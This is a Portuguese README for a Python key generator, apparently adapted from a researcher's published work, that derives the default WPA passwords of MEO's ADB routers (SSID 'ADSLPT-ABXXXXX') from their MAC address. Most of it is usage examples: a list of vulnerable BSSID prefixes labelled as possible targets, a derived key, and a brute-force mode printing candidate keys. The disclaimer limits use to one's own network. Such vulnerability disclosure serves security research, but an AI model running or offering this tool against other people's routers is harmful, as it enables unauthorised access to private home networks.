Vulnerabilidades nos Routers ADB Italia da MEO. 
==

+ Este algoritmo permite gerar as chaves de encriptação WPA pré-definidas nos Routers da MEO com o SSID "ADSLPT-ABXXXXX".

Referencias
----

* O autor do codigo é [Eduardo Novella](https://twitter.com/enovella_) ([repositório original](https://bitbucket.org/dudux/adbpirelli))  que encontrou a vulnerabilidade nos routers ADB utilizado na Argentina pela operadora Arnet. O codigo neste repositorio encontra-se modificado de modo a funcionar nos routers da MEO com o SSID "ADSLPT-ABXXXXX". Eu não sou o seu autor!

Aviso
----
Não me responsabilizo por qualquer problema que o uso indevido deste codigo, te possa causar seja de que forma for. 
Este codigo serve apenas para testar a segurança da tua rede, pelo que se usares este codigo noutra rede que não seja
a tua não serei responsavel!!

Licence
----
GPLv3
http://gplv3.fsf.org/

Mais info
----
+ http://ednolo.alumnos.upv.es/?p=1883

Utilização

O codigo é escrito em Python
----

	$ python MEO.py -v
	MEO.py 1.5 [2015-07-20] ----> https://github.com/AndrewGomes/ADSLPT-WPA

	$ python MEO.py 
	usage: MEO.py [-h] [-b [BSSID]] [-v] [-l | -a]

	>>> Keygen para as redes WiFi da MEO com o SSID ADSLPT-ABXXXXX Não me
	responsabilizo por qualquer problema que o uso indevido deste codigo, te possa
	causar seja de que forma for. Este codigo serve apenas para testar a
	segurança da tua rede, pelo que se usares este codigo noutra rede que não
	seja a tua não serei responsavel!!


	optional arguments:
	  -h, --help            show this help message and exit
	  -v, --versão         show program's version number and exit
	  -l, --list            Mostrar vulnerabilidades
	  -a, --allkeys         Bruteforce

	required:
	  -b [BSSID], --bssid [BSSID]
	                        Endereço MAC do Router

	(+) Ajuda: python MEO.py -b 11:22:33:44:55:66


	$ python MEO.py -l
	[+] Possiveis alvos:
		 bssid: 00:08:27:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: 00:13:C8:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: 00:17:C2:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: 00:19:3E:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: 00:1C:A2:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: 00:1D:8B:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: 00:22:33:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: 00:8C:54:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: 30:39:F2:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: 74:88:8B:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: 84:26:15:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: A4:52:6F:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: A4:5D:A1:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: D0:D4:12:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: D4:D1:84:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: DC:0B:1A:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
		 bssid: F0:84:2F:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX


	$ python MEO.py -b 11:22:33:44:55:66
	[+] MAC     : 11:22:33:44:55:66
	[+] WPA key : 057mjygg  	SSID: ADSLPT-ABXXXXX

	$ python MEO.py -b 11:22:33:44:55:66 -a
	[+] MAC     : 11:22:33:44:55:66

	wfti5odq8c

	[+] Chaves possiveis para o SSID: ADSLPT-ABXXXXX
	3c1nrhqy  
	tugh1hcf  
	057mjygg  
	hj0wl2c2  
	9yw6um3t  
	ituqajo8  
	wfti5odq 